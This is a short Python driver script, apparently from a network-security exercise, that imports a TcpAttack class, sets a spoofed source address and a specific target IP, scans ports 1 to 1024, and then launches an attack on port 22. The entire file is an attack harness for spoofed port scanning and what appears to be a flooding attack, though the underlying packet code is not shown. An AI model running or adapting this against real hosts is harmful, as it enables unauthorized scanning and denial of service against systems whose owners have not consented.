from TcpAttack import *

if __name__ == "__main__":
    # spoofIP = '127.0.0.2' ; targetIP = '127.0.0.1'
    spoofIP = '10.1.1.1'
    targetIP = '128.46.4.33'
    # targetIP = '100.69.79.255'
    rangeStart = 1 
    rangeEnd = 1024
    port = 22
    Tcp = TcpAttack(spoofIP, targetIP)
    Tcp.scanTarget(rangeStart, rangeEnd)
    if Tcp.attackTarget(port, 10):
        print('port was open to attack')
